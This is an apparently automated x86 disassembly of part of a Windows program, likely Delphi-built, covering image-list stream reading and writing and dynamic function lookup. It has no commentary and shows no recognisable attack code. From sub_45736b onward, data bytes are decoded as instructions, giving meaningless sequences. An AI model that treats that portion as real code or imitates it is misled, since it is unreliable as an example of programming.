mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45663f
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_45666c
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_418310
mov si 0xffff
call sub_40348c
inc ebp
dec edi
jne r-xdata
sub_4566bc
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418200
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418310
cmp ebp eax
jne r-xdata
sub_456714
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407df0
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_456758
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_455f34
mov ebx eax
mov eax edi
call sub_455f34
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_455f34
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456834
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456817
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_456714
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45681e
mov eax [ ebp - 0xc ]
call sub_403290
retn
mov eax edi
call sub_455f34
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_456848
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_455f34
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_456758
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_4568a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_420a8c
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_456848
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4568fc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41aa8c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41aa8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456b80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41a860
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_41a880
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456b63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_4282e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_416cd4
mov eax [ ebp - 0x4 ]
call sub_456f28
xor eax eax
push ebp
push sub_456b46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
cdq
idiv ecx
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456b4d
mov eax [ ebp - 0xc ]
call sub_403290
mov eax [ ebp - 0x14 ]
call sub_403290
mov eax [ ebp - 0x4 ]
call sub_456f2c
retn
inc eax
mov [ ebp - 0x20 ] eax
xor edi edi
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x34 ]
cdq
idiv ecx
mov esi eax
dec esi
test esi esi
jl r-xdata
inc edi
dec [ ebp - 0x20 ]
jne r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416cfc
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_427574
push eax
mov eax [ ebp - 0xc ]
call sub_427574
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424224
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
imul eax ebx
call sub_416cfc
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_427574
push eax
mov eax [ ebp - 0x14 ]
call sub_427574
lea edx [ ebp - 0x30 ]
pop ecx
call sub_424224
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_455e68
dec [ ebp - 0x1c ]
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
sub_456b90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42120c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456bf0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455d00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456bf7
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub eax 0xffffffec
sub_456bf7
mov eax [ ebp - 0x4 ]
call sub_455bf0
test al al
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_456d26
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41a880
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41af88
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a880
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x11 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403290
retn
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_41a880
push 0x0
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42120c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_456d09
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x38
mov eax [ ebp - 0x10 ]
call sub_41a880
lea edx [ ebp - 0x12 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xc ]
dec eax
jne r-xdata
push eax
call ImageList_Read
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_455d00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
sub eax 0xffffffec
mov al [ ebp - 0x12 ]
or [ ebp - 0x11 ] al
push 0x0
push 0x12
mov eax [ ebp - 0x10 ]
call sub_41a880
lea edx [ ebp - 0x11 ]
mov ecx 0x1
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
dec eax
sete bl
sub_456d58
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
call sub_455d90
mov eax edi
call sub_41a860
mov [ esp + 0xc ] eax
mov edx esp
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov bl [ esp ]
and bl 0xff
mov ax [ esp ]
shr ax 0x8
mov [ esp + 0x8 ] al
mov eax [ esp + 0xc ]
cdq
push edx
push eax
mov eax edi
call sub_41a880
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx edi
mov eax esi
call sub_4568fc
cmp bl 0x49
jne r-xdata
cmp [ esp + 0x8 ] 0x4c
jne r-xdata
mov edx edi
mov eax esi
call sub_456b90
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_456de4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42120c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_456ede
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax r-xdata
call sub_40bfe0
mov [ rw-data ] eax
cmp [ rw-data ] 0x60000
jb r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
push r-xdata
call GetModuleHandleA
mov edi eax
test edi edi
je r-xdata
push eax
mov eax ebx
call sub_455d2c
push eax
call ImageList_Write
test eax eax
jne r-xdata
sub eax 0xffffffec
push eax
push 0x1
mov eax ebx
call sub_455d2c
push eax
call [ rw-data ]
test eax eax
je r-xdata
sub eax 0xffffffec
push r-xdata
push edi
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456ee5
mov eax [ ebp - 0x4 ]
call sub_403290
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
jmp r-xdata
sub_456f4c
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov edx esi
call sub_4566bc
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_456f98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_456fbd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_456fc4
retn
sub_45736b
add [ esp + esi * 2 + 0x45 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
je r-xdata
insb
or al 0x42
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add [ esi ] dh
je r-xdata
add [ esi + ecx - 0x77afffbe ] ah
inc ebp
add [ eax + 0x300045a3 ] ah
xchg ecx eax
inc ebp
add [ eax - 0x5b ] dl
inc ebp
add [ esp + ebp * 4 - 0x5587ffbb ] bh
inc ebp
add [ eax + 0xe0045ab ] dh
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
add [ edi ] al
add bh ch
pushfd
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax + eax + 0x69d40000 ] ch
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
int3
sub_457414
clc
push edx
push ecx
push esp
scasb [ edi ]
inc ebp
add ah dh
test al 0x45
add ah al
test eax 0xa9fc0045
inc ebp
add [ esi + ebp * 4 + 0x45 ] ah
add [ eax - 0x52 ] dl
inc ebp
add [ eax - 0x59 ] dl
inc ebp
add [ ecx ] cl
push esp
dec ebp
outsb
jne r-xdata
test al 0x0
je r-xdata
push es
add [ esi ] al
inc edx
inc ebx
push 0x146b6365
jb r-xdata
arpl [ ebx + 0x14 ] bp
insd
inc esp
je r-xdata
push edx
jne r-xdata
add [ ebx ] bh
add [ eax ] al
inc [ ecx + edi * 4 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add bh bh
test al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
outsb
jne r-xdata
je r-xdata
je r-xdata
inc edx
jb r-xdata
dec eax
outsd
je r-xdata
add eax [ eax ]
or [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] 0x0
add [ eax ] al
je r-xdata
popa
outsd
inc ebp
add [ eax - 0x50 ] bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
pop es
inc ebx
push 0x656b6365
adc al 0x5a
inc ebp
add [ eax + eax ] bh
jmp [ edx + esi * 4 ]
cmp [ eax ] al
add bh bh
aam 0xa7
imul esi [ ebp + ebp * 2 + 0x61 ] 0x45702870
add [ eax ] cl
add bh bh
push esp
cmpsd [ esi ] [ edi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop es
add [ 0x61657242 ] al
outsd
outsb
jne r-xdata
imul edx [ eax + edx + 0x300040 ] 0x0
jmp [ edi + 0x45 ]
popad
jns r-xdata
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
insd
test al 0x73
inc ebp
add al dl
push 0x41
add [ eax ] bl
add [ 0x756e654d ] al
jae r-xdata
js r-xdata
je r-xdata
push esp
adc [ eax ] al
aas
add [ eax ] al
jmp [ eax + 0x10045a8 ]
insd
popad
jae r-xdata
add bh bh
cmpsd [ fs : esi ] [ edi ]
inc ebp
add [ eax ] bh
mov al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070008 ] al
popad
jo r-xdata
adc al 0x72
inc ebp
add [ eax + eax ] bh
add bh bh
add [ ebx + 0x10045 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
add eax 0x75411100
je r-xdata
add [ eax ] al
add [ edx ] 0x0
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax - 0x57010000 ] ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6c ] ah
inc ecx
add ah ah
test al 0x45
add [ eax + 0x10045ad ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41060002 ] al
clc
mov al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ ebx + 0x68 ] dl
outsd
jb r-xdata
xchg esp eax
adc [ eax ] al
pop eax
add [ eax ] al
[ eax ]
add bh bh
cwde
mov al 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4804000f ] al
imul ebp [ esi + 0x74 ] r-xdata
inc eax
add [ eax ] al
call [ ecx + ebp * 4 + 0x45 ]
add al bl
mov al 0x45
add [ eax ] al
add [ eax ] al
cmp bh 0xff
adc [ eax ] al
cmp [ eax ] eax
add bh bh
sub [ eax - 0x4f87ffbb ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
jne r-xdata
adc [ eax ] al
cmp al [ eax ]
add bh bh
sbb al 0xaa
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
inc esp
popa
add [ eax ] al
[ eax ]
imul ebp [ edi + 0x6e ] r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] bh
add [ eax ] al
call esp
cmpsd [ esi ] [ edi ]
outsb
mov eax 0x58004228
lodsd [ esi ]
inc ebp
add al dh
lodsd [ esi ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42060006 ] al
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
cwde
add [ eax ] al
inc ebx
jne r-xdata
inc ecx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
outsb
arpl [ ebp + 0x64 ] sp
inc esp
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120016 ] al
outsb
inc ecx
jbe r-xdata
add [ eax ] dl
inc eax
add [ esi ] bh
add [ eax ] al
inc [ ecx + ebp * 4 + 0x45 ]
add [ eax ] bl
mov cl 0x45
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax - 0x77010000 ] cl
add [ eax ] al
or eax [ edx ]
jl r-xdata
inc edx
add al bl
pop es
inc edx
add ah dl
xor al 0x40
ja r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x3c0040 ] dl
add [ eax ] al
add eax [ eax ]
std
les eax [ ebp ]
pop eax
mov esp 0xc4440045
inc ebp
add [ esi + ecx - 0x4497ffbe ] ah
inc ebp
add [ esp + eax * 8 ] dl
inc ebp
add [ eax - 0x44 ] bl
inc ebp
add [ esp + eax * 8 + 0x45 ] al
inc edx
add [ edx ] bl
je r-xdata
add [ esi + ecx + 0xb840042 ] bl
insb
or al 0x42
add [ esi ] ch
js r-xdata
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0xbc
inc ebp
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ esp + eax * 8 ] ch
inc ebp
add al cl
les eax [ ebp ]
je r-xdata
insd
movsb [ edi ] [ esi ]
jno r-xdata
pushfd
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add [ eax ] bl
add [ eax ] al
aam 0x69
js r-xdata
add [ eax - 0x5f010000 ] ah
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0017 ] al
outsb
dec ebp
popad
jae r-xdata
inc edx
add [ ebx + ecx + 0x42 ] bh
test [ ebx ] cl
jb r-xdata
add [ esp + ecx + 0x42 ] ch
inc ebp
add [ ebx + ecx + 0x42 ] dh
dec ecx
je r-xdata
or eax [ edx ]
insd
lea eax [ eax ]
int3
sub_457878
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x79
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
js r-xdata
pushfd
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add [ eax ] ah
add [ eax ] al
xor [ edi + 0x45 ] 0x0
test [ esi ] cl
inc edx
add ah cl
xor al 0x40
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add al 0xbc
inc ebp
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
inc ecx
add [ esp + eax * 8 ] ch
inc ebp
add al cl
les eax [ ebp ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 ] dh
inc ebp
add [ ebx ] cl
add [ 0x756e654d ] al
jae r-xdata
or eax [ edx ]
jl r-xdata
add [ esi + ecx - 0x4497ffbe ] ah
inc ebp
add [ esp + eax * 8 ] dl
inc ebp
add [ edx + ecx * 8 ] al
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
dec ecx
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax ]
add al bh
enter 0x45 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x75 ]
je r-xdata
add [ edx + esi * 2 + 0x45 ] bl
add al ch
enter 0x45 0xf8
inc ebp
add [ eax - 0x37 ] cl
inc ebp
add [ ecx ] cl
push esp
dec ebp
popad
imul ebp [ esi + 0x4d ] 0x8b756e65
ror [ ecx + edi * 2 ] 0x45
add [ edi ] al
or [ ebp + ecx * 2 + 0x61 ] edx
imul ebp [ esi + 0x4d ] 0xc0756e65
js r-xdata
les eax [ ebp ]
add al 0xca
inc edx
adc [ eax ] al
inc eax
add [ eax ] al
call [ eax - 0x3d ]
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
insd
popad
jae r-xdata
push es
add [ eax ] cl
inc edx
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1465646f
pop edx
dec eax
outsd
je r-xdata
or al [ eax ]
or [ edi + 0x6e ] cl
jb r-xdata
jns r-xdata
jb r-xdata
add [ ebx ] al
andps xmm2 [ eax + 0x6f ]
jo r-xdata
outsb
je r-xdata
ja r-xdata
inc ebp
add [ eax ] cl
add bh bh
mov esp es
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060007 ] al
adc al 0x5a
pop esp
jb r-xdata
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
fdivr [ edx + 0x45 ]
jo r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x45 ] dl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
push esp
jpe r-xdata
adc [ eax ] al
inc ecx
add [ eax ] al
inc [ eax + ecx * 8 + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jne r-xdata
add al 0x0
adc [ ecx + 0x75 ] eax
je r-xdata
add [ eax ] cl
leave
inc ebp
add [ eax ] bl
leave
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6f42616d
insd
jo r-xdata
je r-xdata
je r-xdata
insd
popad
inc edx
outsd
outsb
je r-xdata
insb
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] eax
jne r-xdata
push esp
dec ebp
dec esp
je r-xdata
je r-xdata
add [ esi ] al
jo r-xdata
je r-xdata
outsb
je r-xdata
or [ eax ] eax
push cs
push eax
popad
jb r-xdata
add bh bh
test al cl
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsd
dec ebp
jb r-xdata
add [ edx + esi + 0x40 ] al
add [ eax + edx * 8 + 0x45 ] bl
add al dh
mov [ ecx ] eax
mov [ edx ] cs
inc edx
add [ ecx + ecx * 4 ] cl
outsd
insd
push esp
outsd
push esp
outsd
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
jpo r-xdata
outsd
inc edx
outsd
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edx + edi * 2 + 0x740d0045 ] dl
bound edx [ edx + 0x69 ]
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0x0
push esp
outsd
or [ eax + 0x61 ] dh
jo r-xdata
outsd
jne r-xdata
aam 0x7a
inc ebp
add [ 0x654c616d ] cl
je r-xdata
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x6865646f
jo r-xdata
popad
int3
or eax [ edx ]
jl r-xdata
inc edx
add [ esp + ecx + 0x42 ] ch
add [ esi + ecx + 0xb840042 ] bl
inc edx
add [ ebx + ecx + 0x42 ] bh
add eax 0x756e654d
